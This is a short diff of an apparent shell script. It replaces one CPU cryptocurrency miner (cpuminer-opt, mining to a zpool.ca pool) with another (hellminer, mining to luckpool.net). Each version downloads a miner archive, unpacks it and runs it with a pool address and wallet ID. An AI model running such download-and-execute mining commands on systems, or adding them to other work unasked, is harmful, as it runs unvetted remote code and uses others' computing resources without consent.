@@ -1,3 +1,4 @@
-wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.36/cpuminer-opt-linux.tar.gz
-tar xf cpuminer-opt-linux.tar.gz
-./cpuminer -a yescrypt -o stratum+tcp://yescrypt.sea.mine.zpool.ca:6233 -u DESjF7Uas3mn7EahRYEJWgcp4ndm1peEQa.DGB -t6
+sudo apt update
+wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+tar xf hellminer_cpu_linux.tar.gz
+./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RYSD8aiWoQoEgMuRf6HXWc5HvtiJXoaURV.EZA -p x --cpu 4
